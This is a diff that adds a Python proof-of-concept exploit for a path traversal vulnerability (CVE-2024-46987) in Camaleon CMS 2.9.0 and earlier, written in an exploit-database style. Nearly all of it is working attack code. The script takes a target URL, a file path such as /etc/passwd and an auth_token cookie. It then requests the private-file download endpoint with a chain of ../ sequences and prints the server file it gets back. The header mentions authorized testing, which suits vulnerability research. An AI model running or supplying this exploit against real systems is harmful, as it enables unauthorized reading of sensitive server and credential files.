@@ -1,0 +1,99 @@
+# Exploit Title: Camaleon CMS v2.9.0 - Path Traversal
+# Date: 2026-02-02
+# Exploit Author: Sakshi Velampudi (CyberQuestor)
+# Vendor Homepage: https://github.com/owen2345/camaleon-cms
+# Software Link: https://github.com/owen2345/camaleon-cms/releases/tag/2.9.0
+# Version: <= 2.9.0
+# Tested on: Linux
+# CVE: CVE-2024-46987
+# Authentication: Required (auth_token cookie)
+
+# --------------------------------------------------
+# Description
+# Sends a single HTTP GET request to a vulnerable private file download endpoint
+# Uses an auth_token cookie required for admin access
+# Detects invalid authentication via redirect to /admin/login
+# Displays a preview of the response when file retrieval succeeds
+
+# Usage:
+# Run only against systems explicitly authorized for testing
+# --------------------------------------------------
+
+
+
+"""
+Camaleon CMS v2.9.0 - Path Traversal Proof of Concept
+
+"""
+
+import requests
+
+print("\nCamaleon CMS v2.9.0 - Path Traversal PoC (authorized testing only)\n")
+
+# --------------------------------------------------
+# 1) Input Collection
+# --------------------------------------------------
+target_url = input("Target base URL (example: http://target.com): ").strip()
+requested_path = input("File path to request (example: /etc/passwd): ").strip()
+token = input("auth_token value: ").strip()
+
+if not target_url or not requested_path or not token:
+    print("\n[!] Error: URL, file path, and auth_token are required.\n")
+    raise SystemExit(1)
+
+# Normalize base URL to avoid malformed paths
+target_url = target_url.rstrip("/")
+
+# --------------------------------------------------
+# 2) Request Construction
+# --------------------------------------------------
+url = (
+    f"{target_url}"
+    f"/admin/media/download_private_file"
+    f"?file=../../../../../../{requested_path.lstrip('/')}"
+)
+
+cookies = {"auth_token": token}
+
+# --------------------------------------------------
+# 3) Request Execution
+# --------------------------------------------------
+# Redirects are disabled to capture authentication failures.
+try:
+    response = requests.get(url, cookies=cookies, timeout=10, allow_redirects=False)
+except requests.exceptions.RequestException as e:
+    print(f"\n[!] Request error: {e}\n")
+    raise SystemExit(2)
+
+# --------------------------------------------------
+# 4) Response Handling
+# --------------------------------------------------
+print(f"\n[+] HTTP Status: {response.status_code}")
+
+# Invalid authentication typically results in a redirect to the admin login page
+if response.status_code == 302:
+    location = response.headers.get("Location", "")
+    if "/admin/login" in location:
+        print(f"[!] auth_token may be incorrect or expired (redirected to {location}).")
+    else:
+        print(f"[!] Redirected to: {location or '(no Location header)'}")
+    raise SystemExit(1)
+
+# Successful response
+if response.status_code == 200:
+    print("\n[+] Response preview:\n")
+
+    preview = response.text[:3000]
+    print(preview)
+
+    if len(response.text) > 3000:
+        print("\n...output truncated...")
+    raise SystemExit(0)
+
+# Other failure conditions
+print("\n[!] Request failed.")
+if response.status_code == 500:
+    print("[!] The file path may be invalid, or the server encountered an internal error.")
+
+print(f"[i] Response length: {len(response.content)} bytes")
+raise SystemExit(1)
